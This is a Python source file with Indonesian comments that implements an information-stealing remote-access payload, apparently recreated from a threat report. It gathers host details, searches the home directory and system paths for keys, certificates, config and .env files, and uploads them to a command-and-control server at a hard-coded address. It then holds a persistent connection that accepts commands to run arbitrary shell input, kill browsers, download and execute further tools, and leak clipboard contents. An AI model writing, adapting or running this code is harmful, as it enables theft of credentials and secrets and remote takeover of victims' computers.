import os
import sys
import platform
import socket
import uuid
import requests
import subprocess
import time
import glob
import shutil

# Konfigurasi C2
C2_HOST = "192.168.0.26"
C2_PORT = 2242  # Port persisten sesuai laporan
C2_UPLOAD_URL = f"http://{C2_HOST}:1224/uploads"
C2_KEYS_URL = f"http://{C2_HOST}:1224/keys"
SLEEP_INTERVAL = 5  # Interval untuk koneksi ulang


# Fungsi untuk mengumpulkan informasi sistem
def collect_system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.release(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "uuid": str(uuid.getnode()),  # UUID berdasarkan MAC address
        "architecture": platform.machine()
    }
    return info


# Fungsi untuk mencari file sensitif
def search_sensitive_files():
    sensitive_extensions = ["*.key", "*.pem", "*.conf", "*.cfg", "*.json", "*.env"]
    sensitive_files = []

    # Direktori pencarian
    search_dirs = [os.path.expanduser("~"), "/etc" if os.name != "nt" else "C:\\"]

    for base_dir in search_dirs:
        for ext in sensitive_extensions:
            try:
                files = glob.glob(os.path.join(base_dir, "**", ext), recursive=True)
                sensitive_files.extend(files)
            except Exception as e:
                print(f"[-] Error saat mencari file di {base_dir}: {e}")

    return sensitive_files


# Fungsi untuk mengunggah file ke C2
def upload_file_to_c2(filepath, url):
    try:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            response = requests.post(url, files=files, timeout=10)
            if response.status_code == 200:
                print(f"[+] Berhasil mengunggah {filepath} ke C2")
            else:
                print(f"[-] Gagal mengunggah {filepath}: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah {filepath}: {e}")


# Fungsi untuk mengunggah informasi sistem ke C2
def upload_system_info(info, url):
    try:
        response = requests.post(url, json=info, timeout=10)
        if response.status_code == 200:
            print("[+] Berhasil mengunggah informasi sistem ke C2")
        else:
            print(f"[-] Gagal mengunggah informasi sistem: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah informasi sistem: {e}")


# Fungsi untuk mengeksekusi perintah dari C2
def execute_command(command):
    try:
        if command.startswith("SSH_OBJECT"):
            cmd = command.split(":", 1)[1]
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            return result
        elif command == "SSH_CMD":
            # Hentikan semua proses Python (contoh)
            if platform.system() == "Windows":
                subprocess.run("taskkill /IM python.exe /F", shell=True)
            else:
                subprocess.run("pkill -f python", shell=True)
            return "Terminated Python processes"
        elif command == "CALC":
            os.system("calc.exe")
        elif command == "SSH_KILL":
            # Hentikan browser (contoh: Chrome)
            if platform.system() == "Windows":
                subprocess.run("taskkill /IM chrome.exe /F", shell=True)
            else:
                subprocess.run("pkill -f chrome", shell=True)
            return "Terminated browser"
        elif command.startswith("SSH_ANY"):
            # Unduh dan jalankan alat tambahan (contoh: AnyDesk)
            tool_url = f"http://{C2_HOST}:1224/adc"
            tool_path = os.path.join(os.path.expanduser("~"), "tool.exe")
            response = requests.get(tool_url, timeout=10)
            with open(tool_path, "wb") as f:
                f.write(response.content)
            subprocess.Popen([tool_path], shell=True)
            return f"Downloaded and executed {tool_path}"
        elif command.startswith("SSH_ENV"):
            # Kumpulkan dan unggah file .env
            env_files = glob.glob(os.path.join(os.path.expanduser("~"), "**", ".env"), recursive=True)
            for env_file in env_files:
                upload_file_to_c2(env_file, C2_UPLOAD_URL)
            return f"Uploaded {len(env_files)} .env files"
        else:
            return f"Unknown command: {command}"
    except Exception as e:
        return f"Error executing command: {e}"


# Fungsi utama Payload
def payload():
    print("[*] Payload dimulai...")

    # Kumpulkan dan unggah informasi sistem
    system_info = collect_system_info()
    upload_system_info(system_info, C2_KEYS_URL)

    # Cari dan unggah file sensitif
    sensitive_files = search_sensitive_files()
    for file in sensitive_files:
        upload_file_to_c2(file, C2_UPLOAD_URL)

    # Koneksi persisten ke C2 untuk perintah
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_HOST, C2_PORT))
                print(f"[+] Terhubung ke C2 di {C2_HOST}:{C2_PORT}")

                while True:
                    # Terima perintah dari C2
                    command = s.recv(4096).decode('utf-8').strip()
                    if not command:
                        break

                    print(f"[*] Perintah diterima: {command}")

                    # Eksekusi perintah dan kirim hasil
                    result = execute_command(command)
                    s.send(result.encode('utf-8'))

                    # Jika perintah SSH_CLIP, kirim isi clipboard (contoh sederhana)
                    if command == "SSH_CLIP":
                        try:
                            import pyperclip
                            clipboard_data = pyperclip.paste()
                            s.send(f"Clipboard: {clipboard_data}".encode('utf-8'))
                        except ImportError:
                            s.send("Clipboard monitoring not available".encode('utf-8'))

        except Exception as e:
            print(f"[-] Error koneksi ke C2: {e}")
            time.sleep(SLEEP_INTERVAL)


if __name__ == "__main__":
    payload()